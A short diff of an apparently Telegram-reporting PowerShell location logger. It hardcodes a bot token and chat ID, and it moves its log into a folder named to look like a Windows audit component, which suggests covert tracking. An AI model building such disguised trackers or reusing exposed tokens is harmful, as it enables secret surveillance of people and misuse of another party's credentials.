@@ -1,7 +1,7 @@
 ﻿# --- KONFIGURASI TELEGRAM ---
 $TelegramToken = "8717446156:AAGhWMtcY1HgArk-aVZCEXj1aco7E6FEBhY"
 $TelegramChatID = "1229343863"
-$LogFile = "C:\Scripts\LocationHistory.txt"
+$LogFile = "C:\ProgramData\WindowsAudit\LocationHistory.txt"
 
 # --- PRIVACY & ENFORCEMENT (Diberi Try-Catch agar tidak error jika bukan Admin) ---
 try {
@@ -183,4 +183,5 @@ if (!$Location.IsUnknown) {
         "[$Timestamp] Telegram Send Error" | Out-File -FilePath $LogFile -Append
     }
 }
+
 $Watcher.Stop()
